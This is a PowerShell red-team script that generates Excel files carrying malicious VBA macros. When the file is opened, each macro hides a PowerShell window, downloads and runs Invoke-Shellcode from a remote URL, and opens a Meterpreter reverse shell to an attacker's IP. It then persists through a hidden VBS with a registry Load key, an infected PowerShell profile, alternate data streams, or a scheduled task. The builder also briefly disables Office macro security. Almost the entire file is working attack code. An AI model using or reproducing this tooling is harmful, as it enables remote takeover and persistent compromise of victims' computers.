#Coded by Matt Nelson (@enigma0x3)
<#
.SYNOPSIS
Standalone Powershell script that will generate a malicious Microsoft Office document with a specified payload and persistence method

.DESCRIPTION
This script will generate malicious Microsoft Excel Documents that contain VBA macros. This script will prompt you for your attacking IP 
(the one you will receive your shell at), the port you want your shell at, and the name of the document. From there, the script will then
display a menu of different attacks, all with different persistence methods. Once an attack is chosen, it will then prompt you for your payload type
(Only HTTP and HTTPS are supported).

When naming the document, don't include a file extension.

These attacks use Invoke-Shellcode, which was created by Matt Graeber. Follow him on Twitter --> @mattifestation

PowerSploit Function: Invoke-Shellcode
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None


.Attack Types
Meterpreter Shell with Logon Persistence: This attack delivers a meterpreter shell and then persists in the registry 
by creating a hidden .vbs file in C:\Users\Public and then creates a registry key in HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load
that executes the .vbs file on login.

Meterpreter Shell with Powershell Profile Persistence: This attack requires the target user to have admin right but is quite creative. It will
deliver you a shell and then drop a malicious .vbs file in C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\cookie.vbs. Once dropped, it creates
an infected Powershell Profile file in C:\Windows\SysNative\WindowsPowerShell\v1.0\ and then creates a registry key in 
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load that executes Powershell.exe on startup. Since the Powershell profile loads automatically when 
Powershell.exe is invoked, your code is executed automatically.

Meterpreter Shell with Alternate Data Stream Persistence: This attack will give you a shell and then persists my creating 2 alternate data streams attached to the AppData
folder. It then creates a registry key that parses the Alternate Data Streams and runs the Base64 encoded payload.

Meterpreter Shell with Scheduled Task Persistence: This attack will give you a shell and then persist by creating a scheduled task with the action set to
the set payload. 


.EXAMPLE
PS> ./Generate-Macro.ps1
Enter IP Address: 10.0.0.10
Enter Port Number: 1111
Enter the name of the document (Do not include a file extension): FinancialData

--------Select Attack---------
1. Meterpreter Shell with Logon Persistence
2. Meterpreter Shell with Powershell Profile Persistence (Requires user to be local admin)
3. Meterpreter Shell with Alternate Data Stream Persistence
4. Meterpreter Shell with Scheduled Task Persistence
------------------------------
Select Attack Number & Press Enter: 1

--------Select Payload---------
1. Meterpreter Reverse HTTPS
2. Meterpreter Reverse HTTP
------------------------------
Select Payload Number & Press Enter: 1
Saved to file C:\Users\Malware\Desktop\FinancialData.xls
PS>




#>
$global:defLoc = "$env:userprofile\Desktop"
$global:IS_Url = Read-Host "Enter URL of Invoke-Shellcode script (If you use GitHub, use the raw version)"
$global:IP = Read-Host "Enter IP Address"
$global:Port = Read-Host "Enter Port Number"
$global:Name = Read-Host "Enter the name of the document (Do not include a file extension)"
$global:Name = $global:Name + ".xls"
$global:FullName = "$global:defLoc\$global:Name"

function Registry-Persistence {
<#
.SYNOPSIS
Uses registry to persist after reboot
.DESCRIPTION
Drops a hidden VBS file and creates a registry key to execute is on startup
#>
#create macro

$Code = @"
Sub Auto_Open()
Execute
Persist
Reg
Start

End Sub

 Public Function Execute() As Variant
        Const HIDDEN_WINDOW = 0
        strComputer = "."
        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
         
        Set objStartup = objWMIService.Get("Win32_ProcessStartup")
        Set objConfig = objStartup.SpawnInstance_
        objConfig.ShowWindow = HIDDEN_WINDOW
        Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
        objProcess.Create "powershell.exe -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force", Null, objConfig, intProcessID
     End Function
     
Public Function Persist() As Variant
 Set fs = CreateObject("Scripting.FileSystemObject")
    Set a = fs.CreateTextFile("C:\Users\Public\config.txt", True)
    a.WriteLine ("Dim objShell")
    a.WriteLine ("Set objShell = WScript.CreateObject(""WScript.Shell"")")
    a.WriteLine ("command = ""C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force""")
    a.WriteLine ("objShell.Run command,0")
    a.WriteLine ("Set objShell = Nothing")
    a.Close
    GivenLocation = "C:\Users\Public\"
    OldFileName = "config.txt"
    NewFileName = "config.vbs"
    Name GivenLocation & OldFileName As GivenLocation & NewFileName
    SetAttr "C:\Users\Public\config.vbs", vbHidden
End Function

Public Function Reg() As Variant
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load", "C:\Users\Public\config.vbs", "REG_SZ"
Set WshShell = Nothing

End Function

Public Function Start() As Variant
 Const HIDDEN_WINDOW = 0
        strComputer = "."
        Shell "wscript C:\Users\Public\config.vbs", vbNormalFocus
      
End Function
"@



#Create excel document
$Excel01 = New-Object -ComObject "Excel.Application"
$ExcelVersion = $Excel01.Version

#Disable Macro Security
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null


$Excel01.DisplayAlerts = $false
$Excel01.DisplayAlerts = "wdAlertsNone"
$Excel01.Visible = $false
$Workbook01 = $Excel01.Workbooks.Add(1)
$Worksheet01 = $Workbook01.WorkSheets.Item(1)

$ExcelModule = $Workbook01.VBProject.VBComponents.Add(1)
$ExcelModule.CodeModule.AddFromString($Code)




#Save the document
Add-Type -AssemblyName Microsoft.Office.Interop.Excel
$Workbook01.SaveAs("$global:FullName", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
Write-Output "Saved to file $global:Fullname"

#Cleanup
$Excel01.Workbooks.Close()
$Excel01.Quit()
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel01) | out-null
$Excel01 = $Null
if (ps excel){kill -name excel}

#Enable Macro Security
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null

#Create Clean-up Script
New-Item $env:userprofile\Desktop\RegistryCleanup.ps1 -type file | Out-Null
$RegistryCleanup = @'
if(Test-Path "C:\Users\Public\config.vbs"){
try{
Remove-Item "C:\Users\Public\config.vbs" -Force
Write-Host "[*]Successfully Removed config.vbs from C:\Users\Public"}catch{Write-Host "[!]Unable to remove config.vbs from C:\Users\Public"}
}else{Write-Host "[!]Path not valid"}
$Reg = "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows"
$RegQuery = Get-ItemProperty $Reg | Select-Object "Load"
if($RegQuery.Load -eq "C:\Users\Public\config.vbs"){
try{
Remove-ItemProperty -Path $Reg -Name "Load"
Write-Host "[*]Successfully Removed Malicious Load entry from HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows"}catch{Write-Host "[!]Unable to remove Registry Entry"}
}else{Write-Host "[!]Path not valid"}
'@
Add-Content $env:userprofile\Desktop\RegistryCleanup.ps1 $RegistryCleanup
Write-Host "Clean-up Script located at $env:userprofile\Desktop\RegistryCleanup.ps1"


}

function PowerShellProfile-Persistence{

$Code = @"
'Coded by Matt Nelson
'twitter.com/enigma0x3
'enigma0x3.wordpress.com

Sub Auto_Open()

Execute
WriteWrapper
WriteProfile
Reg


End Sub

Public Function Execute() As Variant
        Const HIDDEN_WINDOW = 0
        strComputer = "."
        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
         
        Set objStartup = objWMIService.Get("Win32_ProcessStartup")
        Set objConfig = objStartup.SpawnInstance_
        objConfig.ShowWindow = HIDDEN_WINDOW
        Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
        objProcess.Create "powershell.exe -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force", Null, objConfig, intProcessID
     End Function

Public Function WriteWrapper() As Variant
Set fs = CreateObject("Scripting.FileSystemObject")
    Set a = fs.CreateTextFile("C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\cookie.txt", True)
    a.WriteLine ("Dim objShell")
    a.WriteLine ("Set objShell = WScript.CreateObject(""WScript.Shell"")")
    a.WriteLine ("command = ""C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe""")
    a.WriteLine ("objShell.Run command,0")
    a.WriteLine ("Set objShell = Nothing")
    a.Close
    GivenLocation = "C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\"
    OldFileName = "cookie.txt"
    NewFileName = "cookie.vbs"
    Name GivenLocation & OldFileName As GivenLocation & NewFileName
    SetAttr "C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\cookie.vbs", vbHidden

End Function

Public Function WriteProfile() As Variant
Set fs = CreateObject("Scripting.FileSystemObject")
    Set a = fs.CreateTextFile("C:\Windows\SysNative\WindowsPowerShell\v1.0\Profile.txt", True)
    a.WriteLine ("IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force")
    a.Close
    GivenLocation = "C:\Windows\SysNative\WindowsPowerShell\v1.0\"
    OldFileName = "Profile.txt"
    NewFileName = "Profile.ps1"
    Name GivenLocation & OldFileName As GivenLocation & NewFileName
    SetAttr "C:\Windows\SysNative\WindowsPowerShell\v1.0\Profile.ps1", vbHidden
End Function

Public Function Reg() As Variant
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load", "C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\cookie.vbs", "REG_SZ"
Set WshShell = Nothing

End Function

"@



#Create excel document
$Excel01 = New-Object -ComObject "Excel.Application"
$ExcelVersion = $Excel01.Version

#Disable Macro Security
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null


$Excel01.DisplayAlerts = $false
$Excel01.DisplayAlerts = "wdAlertsNone"
$Excel01.Visible = $false
$Workbook01 = $Excel01.Workbooks.Add(1)
$Worksheet01 = $Workbook01.WorkSheets.Item(1)



$ExcelModule = $Workbook01.VBProject.VBComponents.Add(1)
$ExcelModule.CodeModule.AddFromString($Code)


#Save the document
Add-Type -AssemblyName Microsoft.Office.Interop.Excel
$Workbook01.SaveAs("$global:FullName", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
Write-Output "Saved to file $global:Fullname"

#Cleanup
$Excel01.Workbooks.Close()
$Excel01.Quit()
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel01) | out-null
$Excel01 = $Null
if (ps excel){kill -name excel}

#Enable Macro Security
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null

#Create Clean-up Script
New-Item $env:userprofile\Desktop\PowerShellProfileCleanup.ps1 -type file | Out-Null
$PowerShellProfileCleanup = @'
if(Test-Path "C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\cookie.vbs"){
try{
Remove-Item "C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\cookie.vbs" -Force
Write-Host "[*]Successfully Removed cookie.vbs from C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies"}catch{Write-Host "[!]Unable to remove cookie.vbs from C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies"}
}else{Write-Host "[!]Path not valid"}
if(Test-Path "C:\Windows\System32\WindowsPowerShell\v1.0\Profile.ps1"){
try{
Remove-Item "C:\Windows\System32\WindowsPowerShell\v1.0\Profile.ps1" -Force
Write-Host "[*]Successfully Removed Profile.ps1 from C:\Windows\System32\WindowsPowerShell\v1.0"}catch{Write-Host "[!]Unable to remove Profile.ps1 from C:\Windows\System32\WindowsPowerShell\v1.0"}
}else{Write-Host "[!]Path not valid"}
$Reg = "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows"
$RegQuery = Get-ItemProperty $Reg | Select-Object "Load"
if($RegQuery.Load -eq "C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\cookie.vbs"){
try{
Remove-ItemProperty -Path $Reg -Name "Load"
Write-Host "[*]Successfully Removed Malicious Load entry from HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows"}catch{Write-Host "[!]Unable to remove Registry Entry"}
}else{Write-Host "[!]Path not valid"}
'@
Add-Content $env:userprofile\Desktop\PowerShellProfileCleanup.ps1 $PowerShellProfileCleanup
Write-Host "Clean-up Script located at $env:userprofile\Desktop\PowerShellProfileCleanup.ps1"
}

function SchTaskPersistence{
$TimeDelay = Read-Host "Enter User Idle Time before the task runs"
$TaskName = Read-Host "Enter the name you want the task to be called"
$Code = @"
'Coded by Matt Nelson
'twitter.com/enigma0x3
'enigma0x3.wordpress.com

Sub Auto_Open()

Execute
Persist


End Sub

Public Function Execute() As Variant
        Const HIDDEN_WINDOW = 0
        strComputer = "."
        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
         
        Set objStartup = objWMIService.Get("Win32_ProcessStartup")
        Set objConfig = objStartup.SpawnInstance_
        objConfig.ShowWindow = HIDDEN_WINDOW
        Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
        objProcess.Create "powershell.exe -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force", Null, objConfig, intProcessID
     End Function


Public Function Persist() As Variant
        Const HIDDEN_WINDOW = 0
        strComputer = "."
        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
        
        Set objStartup = objWMIService.Get("Win32_ProcessStartup")
        Set objConfig = objStartup.SpawnInstance_
        objConfig.ShowWindow = HIDDEN_WINDOW
        Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
        objProcess.Create "Powershell.exe -WindowStyle Hidden -nop -noexit -c Invoke-Command -ScriptBlock { schtasks /create  /TN $TaskName /TR 'powershell.exe -WindowStyle hidden -noexit -c ''IEX ((New-Object Net.WebClient).DownloadString(''''$global:IS_Url''''''))''; Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force' /SC onidle /i $TimeDelay}", Null, objConfig, intProcessID
     End Function


"@



#Create excel document
$Excel01 = New-Object -ComObject "Excel.Application"
$ExcelVersion = $Excel01.Version

#Disable Macro Security
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null


$Excel01.DisplayAlerts = $false
$Excel01.DisplayAlerts = "wdAlertsNone"
$Excel01.Visible = $false
$Workbook01 = $Excel01.Workbooks.Add(1)
$Worksheet01 = $Workbook01.WorkSheets.Item(1)



$ExcelModule = $Workbook01.VBProject.VBComponents.Add(1)
$ExcelModule.CodeModule.AddFromString($Code)


#Save the document
Add-Type -AssemblyName Microsoft.Office.Interop.Excel
$Workbook01.SaveAs("$global:FullName", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
Write-Output "Saved to file $global:Fullname"

#Cleanup
$Excel01.Workbooks.Close()
$Excel01.Quit()
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel01) | out-null
$Excel01 = $Null

#Enable Macro Security
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null

#Create Clean-up Script
New-Item $env:userprofile\Desktop\SchTaskCleanup.ps1 -type file | Out-Null
$SchTaskCleanup = @"
`$TaskName = "$TaskName"
`$CheckTask = SCHTASKS /QUERY /TN $TaskName
try{
SCHTASKS /Delete /TN $TaskName /F
}catch{Write-Host "[!]Unable to remove malicious task named $TaskName"}
"@
Add-Content $env:userprofile\Desktop\SchTaskCleanup.ps1 $SchTaskCleanup
Write-Host "Clean-up Script located at $env:userprofile\Desktop\SchTaskCleanup.ps1"
}


function AltDS-Persistence{
$AltDSURL = Read-Host "Enter URL of hosted Alternate Data Stream Persistence Script"

$Code = @"
'Coded by Matt Nelson
'twitter.com/enigma0x3
'enigma0x3.wordpress.com

Sub Auto_Open()

Execute
ADSPersist


End Sub

Public Function Execute() As Variant
        Const HIDDEN_WINDOW = 0
        strComputer = "."
        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
         
        Set objStartup = objWMIService.Get("Win32_ProcessStartup")
        Set objConfig = objStartup.SpawnInstance_
        objConfig.ShowWindow = HIDDEN_WINDOW
        Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
        objProcess.Create "powershell.exe -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force", Null, objConfig, intProcessID
     End Function
	 
Public Function ADSPersist() As Variant
        Const HIDDEN_WINDOW = 0
        strComputer = "."
        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
         
        Set objStartup = objWMIService.Get("Win32_ProcessStartup")
        Set objConfig = objStartup.SpawnInstance_
        objConfig.ShowWindow = HIDDEN_WINDOW
        Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
        objProcess.Create "powershell.exe -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$AltDSURL')); Invoke-ADSBackdoor -URL $global:IS_Url -Arguments 'Invoke-Shellcode -Payload $Payload -LHost $global:IP -LPort $global:Port -Force'", Null, objConfig, intProcessID
     End Function



"@



#Create excel document
$Excel01 = New-Object -ComObject "Excel.Application"
$ExcelVersion = $Excel01.Version

#Disable Macro Security
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null


$Excel01.DisplayAlerts = $false
$Excel01.DisplayAlerts = "wdAlertsNone"
$Excel01.Visible = $false
$Workbook01 = $Excel01.Workbooks.Add(1)
$Worksheet01 = $Workbook01.WorkSheets.Item(1)



$ExcelModule = $Workbook01.VBProject.VBComponents.Add(1)
$ExcelModule.CodeModule.AddFromString($Code)


#Save the document
Add-Type -AssemblyName Microsoft.Office.Interop.Excel
$Workbook01.SaveAs("$global:FullName", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
Write-Output "Saved to file $global:Fullname"

#Cleanup
$Excel01.Workbooks.Close()
$Excel01.Quit()
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel01) | out-null
$Excel01 = $Null
if (ps excel){kill -name excel}

#Enable Macro Security
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null

#Create Clean-up Script
New-Item $env:userprofile\Desktop\AltDSCleanup.ps1 -type file | Out-Null
$AltDSCleanup = @'
function Remove-ADS {
<#
.SYNOPSIS
Removes an alterate data stream from a specified location.
P/Invoke code adapted from PowerSploit's Mayhem.psm1 module.
Author: @harmj0y, @mattifestation
License: BSD 3-Clause

.LINK
https://github.com/mattifestation/PowerSploit/blob/master/Mayhem/Mayhem.psm1

#>
    [CmdletBinding()] Param(
        [Parameter(Mandatory=$True)]
        [string]$ADSPath
    )
 
    #region define P/Invoke types dynamically
    #   stolen from PowerSploit https://github.com/mattifestation/PowerSploit/blob/master/Mayhem/Mayhem.psm1
    $DynAssembly = New-Object System.Reflection.AssemblyName('Win32')
    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32', $False)
 
    $TypeBuilder = $ModuleBuilder.DefineType('Win32.Kernel32', 'Public, Class')
    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
    $SetLastError = [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor,
        @('kernel32.dll'),
        [Reflection.FieldInfo[]]@($SetLastError),
        @($True))
 
    # Define [Win32.Kernel32]::DeleteFile
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('DeleteFile',
        'kernel32.dll',
        ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
        [Reflection.CallingConventions]::Standard,
        [Bool],
        [Type[]]@([String]),
        [Runtime.InteropServices.CallingConvention]::Winapi,
        [Runtime.InteropServices.CharSet]::Ansi)
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
    
    $Kernel32 = $TypeBuilder.CreateType()
    
    $Result = $Kernel32::DeleteFile($ADSPath)

    if ($Result){
        Write-Verbose "Alternate Data Stream at $ADSPath successfully removed."
    }
    else{
        Write-Verbose "Alternate Data Stream at $ADSPath removal failure!"
    }

    $Result
}


function Remove-ADSBackdoor {
<#
.SYNOPSIS
Removes the backdoor installed by Invoke-ADSBackdoor.

.DESCRIPTION
This function will remove the persistence installed by Invoke-ADSBackdoor by parsing
the run registry run key, removing the alternate data stream files, and then
removing the registry key.
#>

    # get the VBS trigger command/file location from the registry
    $trigger = (gp HKCU:\Software\Microsoft\Windows\CurrentVersion\Run Update).Update
    $vbsFile = $trigger.split(" ")[1]
    $getWrapperADS = {cmd /C "more <  $vbsFile"}
    $wrapper = Invoke-Command -ScriptBlock $getWrapperADS

    if ($wrapper -match 'i in \((.+?)\)')
    {
        # extract out the payload .txt file location
        $textFile = $matches[1]
        if($( Remove-ADS $textFile)){
            "Successfully removed payload file $textFile"
        }
        else{
            "[!] Error in removing payload file $textFile"
        }
        
    }
    else{
        "[!] Error: couldn't extract PowerShell script location from VBS wrapper $vbsFile"
    }

    if($(Remove-ADS $vbsFile)){
        "Successfully removed wrapper file $vbsFile"
    }
    else{
         "[!] Error in removing payload file $textFile"
    }

    # remove the registry run key
    Remove-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update;
    "Successfully removed Malicious Update entry from HKCU:Software\Microsoft\Windows\CurrentVersion\Run"
}
Remove-ADSBackdoor
'@
Add-Content $env:userprofile\Desktop\AltDSCleanup.ps1 $AltDSCleanup
Write-Host "Clean-up Script located at $env:userprofile\Desktop\AltDSCleanup.ps1"
}



#Determine Attack
Do {
Write-Host "
--------Select Attack---------
1. Meterpreter Shell with Logon Persistence
2. Meterpreter Shell with Powershell Profile Persistence (Requires user to be local admin)
3. Meterpreter Shell with Alternate Data Stream Persistence
4. Meterpreter Shell with Scheduled Task Persistence
------------------------------"
$AttackNum = Read-Host -prompt "Select Attack Number & Press Enter"
} until ($AttackNum -eq "1" -or $AttackNum -eq "2" -or $AttackNum -eq "3" -or $AttackNum -eq "4")



#Determine payload
Do {
Write-Host "
--------Select Payload---------
1. Meterpreter Reverse HTTPS
2. Meterpreter Reverse HTTP
------------------------------"
$PayloadNum = Read-Host -prompt "Select Payload Number & Press Enter"
} until ($PayloadNum -eq "1" -or $PayloadNum -eq "2")

if($PayloadNum -eq "1"){
$Payload = "windows/meterpreter/reverse_https"}
elseif($PayloadNum -eq "2"){
$Payload = "windows/meterpreter/reverse_http"}

#Initiate Attack Choice

if($AttackNum -eq "1"){
    Registry-Persistence}
elseif($AttackNum -eq "2"){
    PowerShellProfile-Persistence
}
elseif($AttackNum -eq "3"){
AltDS-Persistence
}
elseif($AttackNum -eq "4"){
SchTaskPersistence
}
